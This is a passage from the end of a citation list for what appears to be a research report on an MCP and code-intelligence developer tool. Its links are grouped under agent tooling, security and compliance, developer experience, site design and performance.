- [Augment Code Context Engine](https://www.augmentcode.com/tools/monorepo-vs-multi-repo-ai-architecture-based-ai-tool-selection)

### [04] Agent / MCP DX
- [Best practices for Claude Code](https://code.claude.com/docs/en/best-practices)
- [Anthropic — Skill authoring best practices](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/best-practices)
- [Anthropic — Agent Skills overview](https://platform.claude.com/docs/en/agents-and-tools/agent-skills/overview)
- [Anthropic skills repo (GitHub)](https://github.com/anthropics/skills)
- [Claude Code Advanced Patterns](https://resources.anthropic.com/hubfs/Claude%20Code%20Advanced%20Patterns_%20Subagents,%20MCP,%20and%20Scaling%20to%20Real%20Codebases.pdf) (PDF)
- [Tool Design & MCP Integration — Claude Certified Architect](https://claudecertifications.com/claude-certified-architect/domains/tool-design-mcp)
- [CLI Tools vs MCP — jannikreinhard](https://jannikreinhard.com/2026/02/22/why-cli-tools-are-beating-mcp-for-ai-agents/)
- [MindStudio — Reduce Token Usage in AI Agents](https://www.mindstudio.ai/blog/reduce-token-usage-ai-agents-mcp-optimization)
- [eclipsesource — MCP and Context Overload](https://eclipsesource.com/blogs/2026/01/22/mcp-context-overload/)
- [The 2026 MCP Roadmap](https://blog.modelcontextprotocol.io/posts/2026-mcp-roadmap/)
- [TechTarget — Atlassian MCP token-usage updates](https://www.techtarget.com/searchitoperations/news/366642661/Atlassian-MCP-updates-take-aim-at-AI-token-usage)
- [TrueFoundry — MCP Servers in Cursor 2026 Guide](https://www.truefoundry.com/blog/mcp-servers-in-cursor-setup-configuration-and-security-guide)
- [OpenAI — Codex MCP docs](https://developers.openai.com/codex/mcp)
- [Gemini CLI MCP docs](https://geminicli.com/docs/tools/mcp-server/)
- [Google Cloud — Gemini CLI Agent Skills](https://medium.com/google-cloud/your-gemini-cli-extensions-just-got-smarter-introducing-agent-skills-a8fbfa077e7f)
- [OpenAI Agents SDK — Guardrails](https://openai.github.io/openai-agents-python/guardrails/)
- [AuthorityPartners — AI Agent Guardrails 2026](https://authoritypartners.com/insights/ai-agent-guardrails-production-guide-for-2026/)
- [roboticforce/agent-guardrails (GitHub)](https://github.com/roboticforce/agent-guardrails)
- [TechStackUps — MCP Is Solving the Wrong Problem](https://techstackups.com/comparisons/mcp-is-solving-the-wrong-problem/)

### [05] Security + compliance
- [Augment Code — 2026 EU AI Act and AI-Generated Code](https://www.augmentcode.com/guides/eu-ai-act-2026)
- [Help Net Security — EU AI Act logging requirements (Apr 2026)](https://www.helpnetsecurity.com/2026/04/16/eu-ai-act-logging-requirements/)
- [Annex III: High-Risk AI Systems](https://artificialintelligenceact.eu/annex/3/)
- [AI Act Service Desk FAQ](https://ai-act-service-desk.ec.europa.eu/en/faq)
- [Pearl Cohen — New Guidance under the EU AI Act](https://www.pearlcohen.com/new-guidance-under-the-eu-ai-act-ahead-of-its-next-enforcement-date/)
- [Aembit — MCP Security Vulnerabilities Guide 2026](https://aembit.io/blog/the-ultimate-guide-to-mcp-security-vulnerabilities/)
- [General Analysis — MCP Server Security](https://generalanalysis.com/guides/mcp-server-security)
- [SecurityWeek — 'By Design' Flaw in MCP](https://www.securityweek.com/by-design-flaw-in-mcp-could-enable-widespread-ai-supply-chain-attacks/)
- [The Hacker News — Anthropic MCP Design Vulnerability](https://thehackernews.com/2026/04/anthropic-mcp-design-vulnerability.html)
- [heyuan110 — MCP Security 2026: 30 CVEs in 60 Days](https://www.heyuan110.com/posts/ai/2026-03-10-mcp-security-2026/)
- [Kudelski Security — How We Exploited CodeRabbit (Aug 2025)](https://research.kudelskisecurity.com/2025/08/19/how-we-exploited-coderabbit-from-a-simple-pr-to-rce-and-write-access-on-1m-repositories/)
- [Endor Labs — When CodeRabbit became PwnedRabbit](https://www.endorlabs.com/learn/when-coderabbit-became-pwnedrabbit-a-cautionary-tale-for-every-github-app-vendor-and-their-customers)
- [Sigstore — In-Toto Attestations docs](https://docs.sigstore.dev/cosign/verifying/attestation/)
- [SLSA Software attestations](https://slsa.dev/attestation-model)
- [in-toto Attestation Framework (GitHub)](https://github.com/in-toto/attestation)
- [episki — SOC 2 Change Management 2026](https://episki.com/frameworks/soc2/change-management)
- [AuditPath — SOC 2 CC8.1 Requirements](https://www.auditpath.io/blog/soc2-change-management)
- [Teleport — How AI Agents Impact SOC 2](https://goteleport.com/blog/ai-agents-soc-2/)
- [LogicGate — What is ISO 42001](https://www.logicgate.com/blog/what-is-iso-42001-your-guide-to-ai-management-systems/)
- [ISO/IEC 42001:2023](https://www.iso.org/standard/42001)
- [OWASP — Vulnerability Disclosure Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)
- [HackerOne — Safe Harbor Overview & FAQ](https://docs.hackerone.com/en/articles/8494502-safe-harbor-overview-faq)
- [Disclose.io](https://disclose.io/)
- [Common Paper — Prohibit AI Training clause](https://commonpaper.com/standards/cloud-service-agreement/prohibit-ai-training/)

### [06] Developer experience
- [Larridin — Developer Productivity Benchmarks 2026](https://larridin.com/developer-productivity-hub/developer-productivity-benchmarks-2026)
- [Prospeo — Time-to-Value Benchmarks](https://prospeo.io/s/time-to-value-ttv)
- [Userpilot — Onboarding UX Examples](https://userpilot.com/blog/onboarding-ux-examples/)
- [UXCam — 12 Apps with Great User Onboarding](https://uxcam.com/blog/10-apps-with-great-user-onboarding/)
- [clig.dev — Command Line Interface Guidelines](https://clig.dev/)
- [Fuchsia CLI Help Requirements](https://fuchsia.dev/fuchsia-src/development/api/cli_help)
- [Stripe — Connect Onboarding Configurations](https://docs.stripe.com/connect/onboarding)
- [Nimbalyst — Claude Code MCP Setup 2026](https://nimbalyst.com/blog/claude-code-mcp-setup/)
- [BuildToLaunch — MCP Server Install Guide](https://buildtolaunch.substack.com/p/mcp-server-types-installation-guide-claude-cursor)
- [AgentRank — MCP Setup Claude / Cursor / Windsurf](https://agentrank-ai.com/blog/mcp-setup-guide-claude-cursor-windsurf/)
- [PEP 668](https://peps.python.org/pep-0668/)
- [Pythonspeed — externally-managed-environment](https://pythonspeed.com/articles/externally-managed-environment-pep-668/)
- [Toptal — Onboarding UX Guide](https://www.toptal.com/designers/product-design/guide-to-onboarding-ux)
- [Calmops — Developer Experience 2026](https://calmops.com/software-engineering/developer-experience-dx-software-engineering/)

### [07] Site / brand / accessibility
- [Lovable — Landing page best practices 2026](https://lovable.dev/guides/landing-page-best-practices-convert)
- [Perfect Afternoon — Hero section design 2026](https://www.perfectafternoon.com/2025/hero-section-design/)
- [Vezadigital — Best SaaS homepage examples 2026](https://www.vezadigital.com/post/best-saas-homepage-design-examples)
- [Tenet — SaaS hero best practices](https://www.wearetenet.com/blog/saas-hero-section-best-practices)
- [Prismic — Hero section guide](https://prismic.io/blog/website-hero-section)
- [OGMagic — Social media preview sizes 2026](https://ogmagic.dev/blog/social-media-preview-image-sizes)
- [Krumzi — Open Graph image sizes 2026](https://www.krumzi.com/blog/open-graph-image-sizes-for-social-media-the-complete-2026-guide)
- [W3C WCAG 2.2 spec](https://www.w3.org/TR/WCAG22/)
- [TheWCAG — Getting started with WCAG 2.2](https://www.thewcag.com/getting-started)
- [Web Accessibility Checker — WCAG 2.2 checklist 2026](https://web-accessibility-checker.com/en/blog/wcag-2-2-checklist-2026)
- [KlientBoost — CTA copy guide 2026](https://www.klientboost.com/landing-pages/call-to-action-copy/)
- [Daily.dev — CTAs for developers](https://business.daily.dev/resources/one-weird-trick-to-make-your-cta-not-suck-for-devs/)
- [LaunchWall — Social proof for SaaS landing pages](https://launchwall.online/blog/social-proof-for-saas-landing-pages)
- [Digital Applied — Landing page statistics 2026](https://www.digitalapplied.com/blog/landing-page-statistics-2026-conversion-data-points)

### [08] Performance + scale
- [Codebase-Memory: Tree-Sitter-Based Knowledge Graphs (arXiv)](https://arxiv.org/abs/2603.27277)
- [dasroot — Incremental Parsing with Tree-sitter](https://dasroot.net/posts/2026/02/incremental-parsing-tree-sitter-code-analysis/)
- [Speeding up tree-sitter-haskell 50x — owen.cafe](https://owen.cafe/posts/tree-sitter-haskell-perf/)
- [GitNexus — Worker-pool architecture (DeepWiki)](https://deepwiki.com/abhigyanpatwari/GitNexus/3.3-worker-pool-and-parallel-processing)
- [SQLite FTS5 Extension](https://sqlite.org/fts5.html)
- [Zenn — Improving Japanese FTS5 Accuracy 2026](https://zenn.dev/mtk0/articles/sui-memory-fts5-search-tuning?locale=en)
- [simonw/sqlite-fts5-trigram (GitHub)](https://github.com/simonw/sqlite-fts5-trigram)
- [David Muraya — FTS5 Trigram for Name Matching](https://davidmuraya.com/blog/sqlite-fts5-trigram-name-matching/)
- [SQLite mmap docs](https://www.sqlite.org/mmap.html)
- [SQLite PRAGMA reference](https://sqlite.org/pragma.html)
- [PhotoStructure — VACUUM in WAL Mode](https://photostructure.com/coding/how-to-vacuum-sqlite/)
- [FastMCP 3.0 announcement](https://gofastmcp.com/getting-started/welcome)
- [Fastio — MCP Server Caching](https://fast.io/resources/mcp-server-caching/)
- [TM Dev Lab — Multi-Language MCP Performance Benchmark](https://www.tmdevlab.com/mcp-server-performance-benchmark.html)
- [Fastio — Building Stateful MCP Servers](https://fast.io/resources/building-stateful-mcp-servers/)
- [rust-analyzer — Durable Incrementality](https://rust-analyzer.github.io/blog/2023/07/24/durable-incrementality.html)
- [Ilya Lakhin — Salsa Algorithm Explained](https://medium.com/@eliah.lakhin/salsa-algorithm-explained-c5d6df1dd291)
- [Rust Compiler — Incremental compilation in detail](https://rustc-dev-guide.rust-lang.org/queries/incremental-compilation-in-detail.html)
- [Sourcegraph — zoekt (GitHub)](https://github.com/sourcegraph/zoekt)
- [Sourcegraph — Why code search at scale matters](https://sourcegraph.com/blog/why-code-search-at-scale-is-essential-when-you-grow-beyond-one-repository)
- [HN — Code search is hard (discussion)](https://news.ycombinator.com/item?id=39993976)
- [johal.in — Joblib + Loky 2026 guide](https://johal.in/python-batch-processing-with-joblib-parallel-loky-backends-scheduling-2026/)
- [Pandas Parallel Processing Guide 2026](https://pythondatabench.com/article/speed-up-pandas-parallel-processing-dask-modin-joblib-multiprocessing-compared)

---

End of file. ~155 recommendations + ~110 source citations. Single source.
